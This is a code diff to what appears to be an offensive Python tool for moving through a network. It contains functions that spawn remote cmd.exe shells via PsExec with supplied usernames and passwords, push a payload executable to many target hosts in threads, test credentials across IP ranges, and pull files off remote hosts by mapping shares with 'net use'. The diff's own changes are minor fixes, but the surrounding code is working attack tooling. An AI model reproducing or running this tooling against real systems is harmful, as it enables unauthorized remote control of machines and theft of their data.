@@ -357,6 +357,7 @@ def menu():
             print("\n[!] Available commands are")
             for command in validCommands:
                 print("|\n|__[+] %s\n| |\n| |__%s\n|    |__%s" % (command, validCommands[command][0], validCommands[command][1]))
+                time.sleep(0.02)
             beep()
 
         if cmd[0] == "getcmd":
@@ -391,7 +392,7 @@ def menu():
                 creds = cmd[2]
                 payload = cmd[3]
                 if len(cmd) >= 5 and cmd[4] == "remote":
-                    rcpy(targList, payload, creds, True)
+                    rcpy(targList, payload, creds, remote=True)
                 else:
                     rcpy(targList, payload, creds)
 
@@ -517,7 +518,7 @@ def getintel(host):
 
 def rconnect(target, uname, pword):
     print("\n[+] Spawning shell\n")
-    os.system(psexec_path + r"-nobanner \\10.181.231.%s -u %s -p %s cmd.exe" % (target, uname, pword))
+    os.system(psexec_path + r" -nobanner \\10.181.231.%s -u %s -p %s cmd.exe" % (target, uname, pword))
 
 
 def credTest(creds="Profile:password", iplist="default"):
@@ -608,6 +609,8 @@ def rcpy(targetList, payload, creds, args="", remote=False):
         payload = "payloads\\pl.exe"
         print(payload_cmd)
         os.system(payload_cmd + " " + args)
+
+
     for i in targetList:
         completeFlags.append(0)
         x = threading.Thread(target=rcpyT, args=(remote, i, uname, password, payload, index))
@@ -617,7 +620,7 @@ def rcpy(targetList, payload, creds, args="", remote=False):
     while 0 in completeFlags:
         pass
     print("\n[+] Done")
-    os.remove("payloads/pl.exe")
+    os.remove("payloads\\pl.exe")
 
 
 def rcpyT(remote, tgt=0, uname="", pword="", payload="", index=0):  # The actual function for executing a command so that it can be threaded
@@ -715,17 +718,17 @@ def rmsgT(reason="", target=""):
 
 def exfil(target, path, usr, passwd):
     targetpath = "\\\\10.181.231." + target + "\\" + path
-    print(targetpath)
+    print("\n[+] Exfil from: " + targetpath + "\n")
     if not os.path.exists("\\exfil"):
         os.system("mkdir exfil")
     os.system(r'net use m: ' + targetpath + ' /user:' + usr + " " + passwd)
     try:
         os.system("move " + '"M:\Start Menu\Programs\StartUp\*.txt" ' + os.getcwd() + "\\exfil\\")
+        print("\n")
     except Exception as ex:
         print("Unable to copy file. %s" % ex)
     finally:
         os.system('net use m: /del /Y')
-
 
 def getDependencies():
     if not os.path.exists(psexec_path):  # Get PSExec if you don't have it in path
